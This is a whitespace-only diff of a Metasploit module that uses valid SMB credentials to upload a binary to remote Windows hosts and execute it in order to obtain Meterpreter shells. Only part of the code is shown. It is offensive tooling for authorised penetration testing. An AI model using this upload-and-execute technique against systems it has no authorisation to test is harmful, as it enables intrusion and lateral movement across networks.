@@ -18,24 +18,23 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-         	'Name'           => 'SMB - Rapid Fire Psexec Module',
-         	'Description'    => %q{This module uploads a binary executeable to one or more hosts and fires it off.  
-         		This can be used simarlry to Eric Milam's 'smbexec.sh' script to achieve meterprter shells from 
-         		several hosts.  Make sure your multi/handler is set up properly before launching.  Note, binaries will be 
-         		left behind in your target's WINDOWS\Temp directory so don't forget to delete them after you are finished.
-	         },
-
-	         'Author'         => [
-	         	'Royce Davis <rdavis[at]accuvant.com>',
-	         	'Twitter: <[at]R3dy__>',
-	         ],
-	         'License'        => MSF_LICENSE,
-	         'References'     => [
-	         	[ 'URL', 'http://www.pentestgeek.com' ],
-	         	[ 'URL', 'http://www.accuvant.com' ],
-	         	[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
-	         ],
-	    ))
+			'Name'           => 'SMB - Rapid Fire Psexec Module',
+			'Description'    => %q{This module uploads a binary executeable to one or more hosts and fires it off.
+				This can be used simarlry to Eric Milam's 'smbexec.sh' script to achieve meterprter shells from
+				several hosts.  Make sure your multi/handler is set up properly before launching.  Note, binaries will be
+				left behind in your target's WINDOWS\Temp directory so don't forget to delete them after you are finished.
+			},
+			'Author'         => [
+				'Royce Davis <rdavis[at]accuvant.com>',
+				'Twitter: <[at]R3dy__>',
+			],
+			'License'        => MSF_LICENSE,
+			'References'     => [
+				[ 'URL', 'http://www.pentestgeek.com' ],
+				[ 'URL', 'http://www.accuvant.com' ],
+				[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
+			],
+		))
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
@@ -43,11 +42,11 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
-		deregister_options('RHOST')			
+		deregister_options('RHOST')
 	end
-	
-	
-	
+
+
+
 	#-----------------------
 	# Main control method
 	#---------------------
@@ -62,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to connect to the target. #{connecterror}")
 			return
 		end
-		
+
 		# Try and authenticate with given credentials
 		begin
 			smb_login()
@@ -73,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 			disconnect()
 			return
 		end
-		
+
 		# Try and execute the module
 		smbshare = datastore['SMBSHARE']
 		begin
@@ -89,11 +88,11 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		disconnect()
 	end
-	
-	
-	
+
+
+
 	#--------------------------------------------------------------------------------------
-	# This method will upload the binary executable to the target's WINDOWS\Temp directory	
+	# This method will upload the binary executable to the target's WINDOWS\Temp directory
 	#--------------------------------------------------------------------------------------
 	def upload_binary(smbshare, ip, exe, cmd, text)
 		print_status("Uploading binary to #{ip}.")
@@ -119,9 +118,9 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		simple.disconnect("\\\\#{ip}\\#{smbshare}")
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------------------------
 	# Check the remote host to see if a file exists first
 	#-----------------------------------------------------
@@ -134,7 +133,7 @@ class Metasploit3 < Msf::Auxiliary
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			remote = simple.open("\\#{text}", 'ro')
 			if remote.read.include?(file)
-				remote.close 
+				remote.close
 				simple.disconnect("\\\\#{ip}\\#{smbshare}")
 				return true
 			end
@@ -150,7 +149,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	
+
 	#----------------------------------------------------------------------------
 	# This method calls the uploaded binary.  Hopefully you'll get some shellz!!
 	#----------------------------------------------------------------------------
@@ -168,9 +167,9 @@ class Metasploit3 < Msf::Auxiliary
 			return executeerror
 		end
 	end
-	
-	
-	
+
+
+
 	#----------------------------------------------------------------------------------
 	# This is the cleanup method, removes .txt file/s created during execution
 	#-----------------------------------------------------------------------------------
@@ -311,7 +310,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
@@ -332,5 +331,5 @@ class Metasploit3 < Msf::Auxiliary
 		simple.disconnect("IPC$")
 		simple.disconnect(smbshare)
 	end
-	
+
 end
